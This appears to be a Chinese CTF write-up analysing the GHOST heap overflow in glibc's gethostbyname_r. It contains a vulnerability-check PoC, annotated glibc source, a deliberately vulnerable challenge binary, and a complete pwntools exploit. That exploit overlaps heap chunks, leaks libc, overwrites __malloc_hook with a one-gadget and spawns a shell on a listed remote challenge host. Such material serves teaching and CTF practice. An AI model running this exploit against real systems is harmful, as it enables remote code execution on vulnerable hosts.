> 原文链接: https://www.anquanke.com//post/id/250852 


# GHOST漏洞解析与题解


                                阅读量   
                                **26528**
                            
                        |
                        
                                                                                    



[![](https://p5.ssl.qhimg.com/t0130f896e74977f20d.png)](https://p5.ssl.qhimg.com/t0130f896e74977f20d.png)



## 漏洞描述
- glibc的__nss_hostname_digits_dots存在缓冲区溢出漏洞，导致使用gethostbyname系列函数的某些软件存在代码执行或者信息泄露的安全风险
- 通过gethostbyname()函数或gethostbyname2()函数，将可能产生一个堆上的缓冲区溢出
- 经由gethostbyname_r()或gethostbyname2_r()，则会触发调用者提供的缓冲区溢出
- 漏洞产生时至多sizeof(char* )个字节可被覆盖
- 影响范围：2.2 &lt;= glibc &lt;=2.17
- gethostbyname*()系列函数
```
#include &lt;netdb.h&gt;

struct hostent * gethostbyname(const char * hostname);   //根据输入的主机名，查找IP地址

/* Glibc2  also  has  reentrant  versions  gethostent_r(),  gethostbyaddr_r(),  gethostbyname_r()  and gethostbyname2_r().  
   The caller supplies a hostent structure ret which will be filled in on success,  and  a  temporary work  buffer  buf  of size buflen.  
   After the call, result will point to the result on success. */
int gethostbyname_r(                            //和gethostbyname原理一样，只是内存分配交给用户
                        const char *name,         //要解析的名字
                        struct hostent *ret,     //保存返回值的地方
                        char *buf,                 //这个函数运行时的缓冲区
                        size_t buflen,             //缓冲区长度
                        struct hostent **result,//如果失败，则result为null，如果成功则指向ret
                        int *h_errnop            //保存错误代码
                  );
```
- 结构体
```
/* Description of data base entry for a single host.  描述一个地址最基本的条目 */
struct hostent
`{`
  char *h_name;            /* Official name of host.  正式主机名*/
  char **h_aliases;        /* Alias list.  别名*/
  int h_addrtype;        /* Host address type.  IP地址类型*/
  int h_length;            /* Length of address.  地址长度*/
  char **h_addr_list;        /* List of addresses from name server.  IP地址列表*/
`}`;
```

[![](https://p4.ssl.qhimg.com/t01e43fd54a92993b83.png)](https://p4.ssl.qhimg.com/t01e43fd54a92993b83.png)
- 用法
```
#include &lt;stdio.h&gt;
#include &lt;netdb.h&gt;
#include &lt;arpa/inet.h&gt;

int main(int argc, char** argv)`{`
    char* name = argv[1];
    struct hostent* host = gethostbyname(name);
    if(host==NULL)
        printf("error\n");
    else`{`
        printf("%s\n", host-&gt;h_name);
        for(int i=0; host-&gt;h_aliases[i]!=NULL; i++)
            printf("\t%s\n", host-&gt;h_aliases[i]);

        printf("IP type %d, IP addr len %d\n", host-&gt;h_addrtype, host-&gt;h_length);
        char buffer[INET_ADDRSTRLEN];
        for(int i=0; host-&gt;h_addr_list[i]!=NULL; i++)`{`
            char* ip = inet_ntop(host-&gt;h_addrtype, host-&gt;h_addr_list[i], buffer, sizeof(buffer));
            printf("\t%s\n", ip);
        `}`
    `}`
`}`
```

[https://blog.csdn.net/daiyudong2020/article/details/51946080](https://blog.csdn.net/daiyudong2020/article/details/51946080)
- 特殊点：`如果name输入的是IP地址，则不会去DNS查询，而是直接写入到hostent指向的内存区中，`这里因为没有进行合法性判断，所以输入奇怪的IP，比如检测代码中的一串0。它会被直接写入tmp.buffer，一同写入的还包括解析的主机信息。所以就很容易超过tmp.buffer的长度，造成溢出。
POC

```
#include &lt;netdb.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;errno.h&gt;
#define CANARY "in_the_coal_mine"
struct
`{`
   char buffer[1024];
   char canary[sizeof(CANARY)];
`}` temp = `{`"buffer", CANARY`}`;

int main(void)
`{`
   struct hostent resbuf;
   struct hostent *result;
   int herrno;
   int retval;
    
   /*** strlen (name) = size_needed - sizeof (*host_addr) - sizeof (*h_addr_ptrs) - 1; ***/
   size_t len = sizeof(temp.buffer) - 16 * sizeof(unsigned char) - 2 * sizeof(char *) - 1;
   char name[sizeof(temp.buffer)];
   memset(name, '0', len);
   name[len] = '\0';
   
    retval = gethostbyname_r(name, &amp;resbuf, temp.buffer, sizeof(temp.buffer), &amp;result, &amp;herrno);
   if (strcmp(temp.canary, CANARY) != 0)
   `{`
      puts("vulnerable");
      exit(EXIT_SUCCESS);
   `}`
   if (retval == ERANGE)
   `{`
      puts("not vulnerable");
      exit(EXIT_SUCCESS);
   `}`
   puts("should not happen");
   exit(EXIT_FAILURE);
`}`
```



## 源码分析

gethostbyname函数入口点在inet/gethsbynm.c系列文件中

```
#define LOOKUP_TYPE	struct hostent
#define FUNCTION_NAME	gethostbyname
#define DATABASE_NAME	hosts
#define ADD_PARAMS	const char *name
#define ADD_VARIABLES	name
#define BUFLEN		1024
#define NEED_H_ERRNO	1

#define HANDLE_DIGITS_DOTS	1

#include &lt;nss/getXXbyYY.c&gt; //通过宏达到模版展开的效果
```
<li> nss/getXXbyYY.c也先通过__nss_hostname_digits_dots()判断是否为IP,
<ul>
- 如果要解析IP的话就直接结束
- 如果是域名那么后面调用__gethostbyname_r()进行解析
```
//根据宏定义, 会自动被展开为一个函数定义, 这里会展开为gethostbyname()的定义
LOOKUP_TYPE *FUNCTION_NAME(const char *name) //函数定义
`{`
    static size_t buffer_size; //静态缓冲区的长度
    static LOOKUP_TYPE resbuf;
    LOOKUP_TYPE *result;

#ifdef NEED_H_ERRNO
    int h_errno_tmp = 0;
#endif

    /* Get lock.  */
    __libc_lock_lock(lock);

    if (buffer == NULL) //如果没有缓冲区就自己申请一个
    `{`
        buffer_size = BUFLEN;
        buffer = (char *)malloc(buffer_size);
    `}`

#ifdef HANDLE_DIGITS_DOTS
    if (buffer != NULL)
    `{`
        /*
            - 发生漏洞的函数
            - __nss_hostname_digits_dots()先对name进行预处理
                - 如果要解析的name就是IP, 那就复制到resbuf中, 然后返回1
                - 如果是域名, 那么就复制到resbuf中, 返回0
            - 如果返回1, 说明解析的就是IP, 你那么进入done, 解析结束
        */
        if (__nss_hostname_digits_dots(name,         //传入的参数: 域名
                                       &amp;resbuf,      //解析结果
                                       &amp;buffer,      //缓冲区
                                       &amp;buffer_size, //缓冲区大小指针
                                       0,            //缓冲区大小
                                       &amp;result,      //存放结果的指针
                                       NULL,         //存放状态的指针
                                       AF_VAL,       //地址族
                                       H_ERRNO_VAR_P //错误代码
                                       ))
            goto done;
    `}`
#endif

    /* DNS域名解析，宏展开
   *    (INTERNAL(REENTRANT_NAME)(ADD_VARIABLES, &amp;resbuf, buffer, buffer_size, &amp;result H_ERRNO_VAR) 
   * =&gt; (INTERNAL(gethostbyname_r)(name, &amp;resbuf, buffer, buffer_size, &amp;result, &amp;h_errno_tmp) 
   * =&gt; (INTERNAL1(gethostbyname_r)(name, &amp;resbuf, buffer, buffer_size, &amp;result, &amp;h_errno_tmp) 
   * =&gt; __gethostbyname_r(name, &amp;resbuf, buffer, buffer_size, &amp;result, &amp;h_errno_tmp)
  */
    while (buffer != NULL &amp;&amp; (INTERNAL(REENTRANT_NAME)(ADD_VARIABLES, &amp;resbuf, buffer, buffer_size, &amp;result H_ERRNO_VAR) == ERANGE)
#ifdef NEED_H_ERRNO
           &amp;&amp; h_errno_tmp == NETDB_INTERNAL
#endif
    )
    `{`
        char *new_buf;
        buffer_size *= 2;
        new_buf = (char *)realloc(buffer, buffer_size);
        if (new_buf == NULL)
        `{`
            /* We are out of memory.  Free the current buffer so that the
         process gets a chance for a normal termination.  */
            free(buffer);
            __set_errno(ENOMEM);
        `}`
        buffer = new_buf;
    `}`

    if (buffer == NULL)
        result = NULL;

#ifdef HANDLE_DIGITS_DOTS
done:
#endif
    /* Release lock.  */
    __libc_lock_unlock(lock);

#ifdef NEED_H_ERRNO
    if (h_errno_tmp != 0)
        __set_h_errno(h_errno_tmp);
#endif

    return result;
`}`
```
<li>漏洞函数：nss/digits_dots.c :__nss_hostname_digits_dots(name, resbuf, buffer, …)
<ul>
- 这个函数负责处理name为IP地址的情况, 当name为域名时只是进行一些复制工作
- name指向要解析的字符串
- resbuf指向存放解析结果的hostennt结构体
- buffer则为解析时所分配的空间, resbuf中的指针指向buffer分配的空间
```
int __nss_hostname_digits_dots(const char *name,        //要解析的名字
                               struct hostent *resbuf,    //存放结果的缓冲区
                               char **buffer,            //缓冲区
                               size_t *buffer_size,        //缓冲区长度 1K
                               size_t buflen,            //0
                               struct hostent **result, //指向结果指针的指针
                               enum nss_status *status, //状态 NULL
                               int af,                    //地址族
                               int *h_errnop)            //错误代码
`{`
    int save;

    //...

    /*
   * disallow names consisting only of digits/dots, unless they end in a dot.
   * 不允许name只包含数字和点，除非用点结束
   */
    if (isdigit(name[0]) || isxdigit(name[0]) || name[0] == ':') //name开头是十进制字符/十六进制字符/冒号，就判断为IP地址
    `{`
        const char *cp;
        char *hostname;

        //host_addr是一个指向16个unsignned char数组的指针
        typedef unsigned char host_addr_t[16];
        host_addr_t *host_addr;

        //h_addr_ptrs就是一个指向两个char*数组的指针
        typedef char *host_addr_list_t[2];
        host_addr_list_t *h_addr_ptrs;

        //别名的指针列表
        char **h_alias_ptr;

        //需要的空间
        size_t size_needed;

        //根据地址族计算IP地址长度
        int addr_size;
        switch (af)
        `{`
        case AF_INET:              //IPV4
            addr_size = INADDRSZ; //INADDRSZ=4
            break;

        case AF_INET6:               //IPV6
            addr_size = IN6ADDRSZ; //IN6ADDRSZ=16
            break;

        default:
            af = (_res.options &amp; RES_USE_INET6) ? AF_INET6 : AF_INET;
            addr_size = af == AF_INET6 ? IN6ADDRSZ : INADDRSZ;
            break;
        `}`

        //计算函数运行所需要的缓冲区大小，这里出了问题，没有给h_alias_ptr分配空间，因此产生溢出
        size_needed = (sizeof(*host_addr) + sizeof(*h_addr_ptrs) + strlen(name) + 1); //16 + 16 + strlen(name) + 1

        //如果buffer_size指针为空, 并且buflen还不够, 那么重新申请缓冲区时就没法更新buffer_size, 只能报错
        if (buffer_size == NULL)
        `{`
            if (buflen &lt; size_needed)
            `{`
                if (h_errnop != NULL)
                    *h_errnop = TRY_AGAIN;
                __set_errno(ERANGE);
                goto done;
            `}`
        `}`
        else if (buffer_size != NULL &amp;&amp; *buffer_size &lt; size_needed) //如果给的缓冲区不足，就重新调整buffer空间
        `{`
            char *new_buf;
            *buffer_size = size_needed;                          //新buffer_size
            new_buf = (char *)realloc(*buffer, *buffer_size); //就把buffer空间调整到所需要的大小
            //分配失败
            if (new_buf == NULL)
            `{`
                save = errno;
                free(*buffer);
                *buffer = NULL;
                *buffer_size = 0;
                __set_errno(save);
                if (h_errnop != NULL)
                    *h_errnop = TRY_AGAIN;
                *result = NULL;
                goto done;
            `}`
            *buffer = new_buf; //写入新缓冲区
        `}`

        //缓冲区初始化
        memset(*buffer, '\0', size_needed);

        //对缓冲区进行分割
        host_addr = (host_addr_t *)*buffer;                                            //占用0x10B        [*buffer, *buffer + 0x10)
        h_addr_ptrs = (host_addr_list_t *)((char *)host_addr + sizeof(*host_addr)); //占用0x10B        [*buffer + 0x10, *buffer + 0x20)

        //这里出了问题，没有给h_alias_ptr分配空间，因此产生溢出
        h_alias_ptr = (char **)((char *)h_addr_ptrs + sizeof(*h_addr_ptrs)); //占用0x8B                [*buffer + 0x20, *buffer + 0x28)
        hostname = (char *)h_alias_ptr + sizeof(*h_alias_ptr);                 //占用strlen(name)+1    [*buffer + 0x28, *buffer + 0x28 + strlen(name) + 1)

        if (isdigit(name[0])) //IPv4: 开头是数字
        `{`
            for (cp = name;; ++cp) //遍历name
            `{`
                if (*cp == '\0') //如果name结束了
                `{`
                    int ok;

                    if (*--cp == '.') //如果是.\0这样的，则非法
                        break;

                    //IP地址是字符串表示，转换成网络序列保存在host_addr中, host_addr用的就是函数内部的缓冲区*buffer
                    if (af == AF_INET)
                        ok = __inet_aton(name, (struct in_addr *)host_addr);
                    else
                    `{`
                        assert(af == AF_INET6);
                        ok = inet_pton(af, name, host_addr) &gt; 0;
                    `}`

                    //转换出错
                    if (!ok)
                    `{`
                        *h_errnop = HOST_NOT_FOUND;
                        if (buffer_size)
                            *result = NULL;
                        goto done;
                    `}`

                    //直接把name复制到hostname中, 用hostname作为结果中的h_name
                    //strcpy从*buffer+0x28开始写入strlen(name)+1, 产生溢出
                    resbuf-&gt;h_name = strcpy(hostname, name);

                    //没有别名
                    h_alias_ptr[0] = NULL;
                    resbuf-&gt;h_aliases = h_alias_ptr;

                    //h_addr_list只有一个
                    (*h_addr_ptrs)[0] = (char *)host_addr; //地址也是一样的
                    (*h_addr_ptrs)[1] = NULL;
                    resbuf-&gt;h_addr_list = *h_addr_ptrs;

                    //设置长度与IP地址类型
                    if (af == AF_INET &amp;&amp; (_res.options &amp; RES_USE_INET6))
                    `{`
                        //...
                    `}`
                    else
                    `{`
                        resbuf-&gt;h_addrtype = af;
                        resbuf-&gt;h_length = addr_size;
                    `}`

                    //返回的状态
                    //...

                    //结束
                    goto done;
                `}`

                if (!isdigit(*cp) &amp;&amp; *cp != '.') //既不是字母，又不是. 那么就不是合法的IPv4，退出
                    break;
            `}`
        `}`

        if ((isxdigit(name[0]) &amp;&amp; strchr(name, ':') != NULL) || name[0] == ':') //IPv6: 开始是hex字符并且包含':'. 或者包含分号
        `{`
            //...
        `}`
    `}`

    return 0;

done:
    return 1;
`}`
```
- 判断IP地址的方法很简陋
[![](https://p3.ssl.qhimg.com/t0124ae3924e47f15c9.png)](https://p3.ssl.qhimg.com/t0124ae3924e47f15c9.png)
- 在生成hostent结构体时出了问题没有计算h_alias_ptr
图示：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01dade1f7b516e4d70.png)
- 因此把hostname复制过去，在这里产生了溢出8B
[![](https://p1.ssl.qhimg.com/t01a4b65f3c461a47b4.png)](https://p1.ssl.qhimg.com/t01a4b65f3c461a47b4.png)
- 函数的数据结构:
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01261270c914aed4e2.jpg)



## 题目解析

### <a class="reference-link" name="%E9%A2%98%E7%9B%AE%E6%BA%90%E7%A0%81"></a>题目源码

```
//gcc pwn.c -g -o pwn
#include &lt;stdio.h&gt;
#include &lt;netdb.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;arpa/inet.h&gt;
#define MAX 16

struct hostent* HostArr[MAX];
char* BufferArr[MAX];
char* NameArr[MAX];

int Menu(void)
`{`
    puts("1.InputName");
    puts("2.ShowHost");
    puts("3.Delete");
    puts("4.Exit");
    printf("&gt;&gt;");
    int cmd;
    scanf("%d", &amp;cmd);
    return cmd;
`}`

void InputName(void)
`{`
    //read idx
    int idx;
    printf("idx:");
    scanf("%d", &amp;idx);
    if(idx&lt;0 || idx&gt;=MAX)
        exit(0);

    //alloc name buf
    int len;
    printf("len:");
    scanf("%d", &amp;len);
    NameArr[idx] = malloc(len+1);
    if(NameArr[idx]==NULL)
        exit(0);

    //read name
    int i;
    for(i=0; i&lt;len; i++)
    `{`
        char C;
        read(0, &amp;C, 1);
        NameArr[idx][i] = C;
        if(NameArr[idx][i]=='\n')
            break;
    `}`
    NameArr[idx][i]='\0';

    //allloc buffer
    int buffer_size = 0x20+len+1;
    BufferArr[idx] = malloc(buffer_size);

    //get host by name
    HostArr[idx] = malloc(sizeof(struct hostent));
    struct hostent* res;    
    int herrno;
    gethostbyname_r(NameArr[idx], HostArr[idx], BufferArr[idx], buffer_size, &amp;res, &amp;herrno);
`}`

void ShowHost(void)
`{`
    //read idx
    int idx;
    printf("idx:");
    scanf("%d", &amp;idx);
    if(idx&lt;0 || idx&gt;=MAX)
        exit(0);

    struct hostent* host = HostArr[idx];

    //host name
    if(host-&gt;h_name!=NULL)
        printf("%s\n", host-&gt;h_name);

    //IP
    if(host-&gt;h_addr_list!=NULL)
           for(int i=0; host-&gt;h_addr_list[i]!=NULL; i++)`{`
            char* ip = host-&gt;h_addr_list[i];
            printf("%s\n", ip);
        `}`
`}`

void Delete(void)
`{`
    //read idx
    int idx;
    printf("idx:");
    scanf("%d", &amp;idx);
    if(idx&lt;0 || idx&gt;=MAX)
        exit(0);

    free(NameArr[idx]);
    NameArr[idx]=NULL;
    free(BufferArr[idx]);
    BufferArr[idx]=NULL;
    free(HostArr[idx]);
    HostArr[idx]=NULL;
`}`

int main(int argc, char** argv)
`{`
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);

    int cmd=0;
    while(1)
    `{`
        cmd = Menu();
        if(cmd==1)
            InputName();
        else if(cmd==2)
            ShowHost();
        else if(cmd==3)
            Delete();
        else
            break;
    `}`
    return 0;
`}`
```
- 编译时保护全开
[![](https://p2.ssl.qhimg.com/t012e4fabcbe90e4a74.png)](https://p2.ssl.qhimg.com/t012e4fabcbe90e4a74.png)
<li>patchelf让编译出的文件使用2.17的libc
<pre><code class="lang-Shell,monokai hljs">patchelf --set-interpreter `pwd`/ld.so.2 --set-rpath `pwd` ./pwn
</code></pre>
</li>


## 思路
<li>构造chunk重叠
<ul>
- 覆盖size的目的是构造chunk重叠, 这样才能控制堆上的各种指针
- __nss_hostname_digits_dots向buffer写入时要求只能是.和十进制字符, 实测发现只写入0是最稳定可以溢出的
- hostent的size本来就是0x30, 只覆盖为一个’0’也还是0x30, 因此覆盖两个0, 让chunksize变成0x3030- 如果覆盖为0x3031, 在chunk后面放0x21的在使用chunk, 直接得到一个非常大的UBchunk
- 使用top chunk作为后一个chunk, 从而与top合并
- 如果覆盖为0x3030, 那么可以通过P=0向前合并
[![](https://p5.ssl.qhimg.com/t01e965e6f83234ec66.png)](https://p5.ssl.qhimg.com/t01e965e6f83234ec66.png)
- check_in_chunk()检查最少的就是后一个chunkP=1, 并且不是top chunk的情况,
[![](https://p4.ssl.qhimg.com/t01c686eaaf392b8709.png)](https://p4.ssl.qhimg.com/t01c686eaaf392b8709.png)
- 因此溢出Bufer的size为0x3031之后, 只需要再Buffer chunk+0x3030处伪造放上一个flat(0, 0x21, 0, 0)的chunk就可得到一个很大的UBchunk
<li>__nss_hostname_digits_dots在写入时对于name限制很多, 因此我们只用他去溢出size, 读入name的过程对字符限制很少, 因此总体思路为
<ul>
- 利用gethostbyname_r()溢出size
- 利用read(0, name, ..)进行写入任意数据
### <a class="reference-link" name="%E6%B3%84%E9%9C%B2%E5%9C%B0%E5%9D%80"></a>泄露地址
<li>Show时会通过hostent结构体中得到指针进行输出, 因此我们打出chunk 重叠之后, 有两个思路
<ul>
- 利用00写入覆盖hostent.h_name指针的最低字节, 使其指向某个指针, 然后泄露地址
- 直接Bin机制在hostent中写入指针, 然后写入地址- 假如有N0 | B0|H0 | N1 | B1 | H1
- 利用__nss_hostname_digits_dots()在写入B0时溢出0的chunk size为0x3031
<li>然后通过布局在H0+0x3030的位置放上flat(0, 0x21, 0, 0)伪造H0的nextchunk<br>
f – ree(H0)即可打出chunk 重叠, 此时UB&lt;=&gt;(B0, H0, N1, B1, H1)</li>
- 然后通过切割UB, 使得UB的fd bk指针写入到H1内部, 如下图
- 然后show(3)即可泄露地址
[![](https://p2.ssl.qhimg.com/t01470fc476dccb0a32.png)](https://p2.ssl.qhimg.com/t01470fc476dccb0a32.png)

### <a class="reference-link" name="getshell"></a>getshell
<li>有了地址之后getshell就很容易了
<ul>
- 再N1 B1 H1后面通过布局0x70的chunk, 然后free掉, 进入Fastbin[0x70]
- 然后继续切割chunk, 修改fastbin chunk的fd为__malloc_hook-0x23, 利用0x7F伪造size
- 然后修改__malloc_hook为OGG
### <a class="reference-link" name="EXP"></a>EXP

```
#! /usr/bin/python
# coding=utf-8
import sys
from pwn import *
from random import randint

context.log_level = 'debug'
context(arch='amd64', os='linux')

elf_path = "./pwn"

elf = ELF(elf_path)
libc = ELF('libc.so.6')

def Log(name):    
    log.success(name+' = '+hex(eval(name)))

if(len(sys.argv)==1):            #local
    cmd = [elf_path]
    sh = process(cmd)
    #proc_base = sh.libs()['/home/parallels/pwn']
else:                            #remtoe
    sh = remote('118.190.62.234', 12435)

def Num(n):
    sh.sendline(str(n))

def Cmd(n):
    sh.recvuntil('&gt;&gt;')
    Num(n)

def Name(idx, name):
    Cmd(1)
    sh.recvuntil('idx:')
    Num(idx)
    sh.recvuntil('len:')
    Num(len(name))
    sh.sendline(name)

def Show(idx):
    Cmd(2)
    sh.recvuntil('idx:')
    Num(idx)

def Delete(idx):
    Cmd(3)
    sh.recvuntil('idx:')
    Num(idx)

#chunk overlap
Name(0, '0'*0x2F)
Name(1, '0'*0x40+'10')
Name(2, '0'*0x5F)

Name(3, '0'*0x1F)
Delete(3)
Name(3, '0'*0x1F)        #switch Name and Host

Name(10, '0'*0x5F)
Name(11, '0'*0x5F)
Name(12, '0'*0x5F)
Name(13, '0'*0x5F)


exp = '0'*0x2950
exp+= flat(0, 0x21, 0, 0)    #B0's next chunk
Name(5, exp)
Delete(1)                #UB&lt;=&gt;(H0, 0x3030)

#leak addr
exp = '0'.ljust(0x7F, '\x00')
Name(6, exp)            #split UB chunk, H3's h_addr_list=UB's bk
Show(3)

sh.recvuntil('0'*0x1F+'\n\n')
heap_addr = u64(sh.recv(6).ljust(8, '\x00'))-0x358
Log('heap_addr')
sh.recv(17)
libc.address = u64(sh.recv(6).ljust(8, '\x00'))-0x3c17a8
Log('libc.address')

#fastbin Attack
Delete(10)
exp = '0'*0x4F
Name(7, exp)

exp = '0'*0x10
exp+= flat(0, 0x71, libc.symbols['__malloc_hook']-0x23)
exp = exp.ljust(0xBF, '0')
Name(7, exp)

Name(8, '0'*0x5F)

exp = '0'*0x13
exp+= p64(libc.address+0x462b8)
Name(8, exp.ljust(0x5F, '0'))


#gdb.attach(sh, '''
#heap bins
#telescope 0x202040+0x0000555555554000 48
#break malloc
#''')



sh.interactive()

'''
NameArr            telescope 0x202040+0x0000555555554000
HostArr            telescope 0x2020C0+0x0000555555554000
BufferArr        telescope 0x2022C0+0x0000555555554000 

0x46262 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rax == NULL

0x462b8 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0xe66b5 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

'''
```
